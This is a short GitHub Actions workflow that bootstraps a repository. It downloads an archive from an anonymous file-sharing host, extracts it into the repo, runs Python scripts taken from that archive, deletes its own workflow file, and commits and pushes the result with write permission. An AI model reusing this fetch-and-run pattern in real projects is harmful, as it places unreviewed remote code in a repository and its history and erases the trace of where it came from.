name: Bootstrap validated research repository

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  bootstrap:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Download validated repository archive
        run: curl -fsSL https://files.catbox.moe/rhx8xc.tgz -o /tmp/repository.tgz
      - name: Install repository content
        run: tar -xzf /tmp/repository.tgz -C .
      - name: Validate and rebuild index
        run: |
          python3 scripts/validate_database.py
          python3 scripts/build_index.py
          python3 scripts/validate_database.py
      - name: Remove one-time bootstrap workflow
        run: rm -f .github/workflows/bootstrap.yml
      - name: Commit generated repository
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Build advanced packaging intelligence database"
          git push
